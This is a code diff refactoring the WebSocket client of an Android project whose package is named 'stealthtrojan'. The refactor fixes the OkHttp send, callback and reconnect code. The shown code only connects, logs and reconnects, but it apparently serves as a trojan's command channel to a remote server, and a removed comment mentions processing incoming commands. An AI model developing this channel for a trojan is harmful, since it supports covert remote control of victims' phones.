@@ -2,9 +2,10 @@ package com.stealthtrojan.app;
 
 import android.util.Log;
 import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.Response;
 import okhttp3.WebSocket;
 import okhttp3.WebSocketListener;
-import okio.BufferedSink;
 
 import java.util.concurrent.TimeUnit;
 
@@ -28,48 +29,40 @@ public class WebSocketClient extends WebSocketListener {
             .readTimeout(0, TimeUnit.SECONDS)
             .build();
 
-        ws = client.newWebSocket(
-            new okhttp3.Request.Builder()
-                .url(SERVER_URL)
-                .build(),
-            this
-        );
+        Request request = new Request.Builder()
+            .url(SERVER_URL)
+            .build();
+
+        ws = client.newWebSocket(request, this);
     }
 
     public void sendMessage(String message) {
         if (ws != null) {
-            BufferedSink sink = ws.writer()
-                .buffer()
-                .writeUtf8(message)
-                .writeByte('\n')
-                .close();
-            sink.flush();
+            ws.send(message);
             Log.d(TAG, "Message sent: " + message);
         }
     }
 
     @Override
-    public void onOpen(WebSocket ws, okhttp3.Response response) {
+    public void onOpen(WebSocket webSocket, Response response) {
         Log.d(TAG, "WebSocket connected");
     }
 
     @Override
-    public void onMessage(WebSocket ws, String message) {
-        Log.d(TAG, "Message received from server: " + message);
-        // Process incoming commands
-        // ...
+    public void onMessage(WebSocket webSocket, String text) {
+        Log.d(TAG, "Message received from server: " + text);
     }
 
     @Override
-    public void onFailure(WebSocket ws, Throwable t, okhttp3.Response response) {
+    public void onFailure(WebSocket webSocket, Throwable t, Response response) {
         Log.e(TAG, "WebSocket connection failed", t);
-        // Reconnect logic
-        ws.close();
+        webSocket.close(1000, "Connection failure");
         connect();
     }
 
     @Override
-    public void onClose(WebSocket ws, int code, String reason) {
+    public void onClosed(WebSocket webSocket, int code, String reason) {
         Log.d(TAG, "WebSocket closed: " + code + " - " + reason);
     }
 }
+
